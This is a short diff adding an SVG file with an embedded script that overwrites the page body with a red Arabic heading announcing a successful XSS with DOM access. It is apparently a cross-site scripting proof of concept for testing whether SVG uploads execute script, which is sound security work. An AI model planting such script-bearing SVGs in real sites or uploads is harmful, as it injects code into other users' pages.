@@ -1,0 +1,5 @@
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>
+    document.body.innerHTML = "<h1 style='color:red'>XSS ناجحة مع وصول للـ DOM</h1>";
+  </script>
+</svg>
